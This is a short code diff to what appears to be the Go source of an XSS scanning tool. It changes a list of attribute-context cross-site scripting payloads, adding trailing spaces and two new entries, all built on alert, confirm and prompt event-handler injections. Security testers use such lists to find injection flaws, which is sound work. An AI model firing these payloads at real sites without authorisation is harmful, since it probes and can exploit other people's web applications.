@@ -215,11 +215,13 @@ func getHTMLPayload(ip string) []string {
 // getAttrPayload is is return xss
 func getAttrPayload(ip string) []string {
 	payload := []string{
-		"onmouseleave=confirm(DALFOX_ALERT_VALUE) class=dalfox",
-		"><SvG/onload=alert(DALFOX_ALERT_VALUE) class=dalfox>",
+		"onmouseleave=confirm(DALFOX_ALERT_VALUE) class=dalfox ",
+		"><SvG/onload=alert(DALFOX_ALERT_VALUE) class=dalfox> ",
 		"</ScriPt><sCripT class=dalfox>alert(DALFOX_ALERT_VALUE)</sCriPt>",
-		"onpointerenter=prompt`DALFOX_ALERT_VALUE` class=dalfox",
-		"onmouseleave=confirm(DALFOX_ALERT_VALUE) id=dalfox",
+		"onpointerenter=prompt`DALFOX_ALERT_VALUE` class=dalfox ",
+		"onmouseleave=confirm(DALFOX_ALERT_VALUE) id=dalfox ",
+		"/class=dalfox ",
+		"/id=dalfox ",
 		"/class=dalfox",
 		"/id=dalfox",
 	}
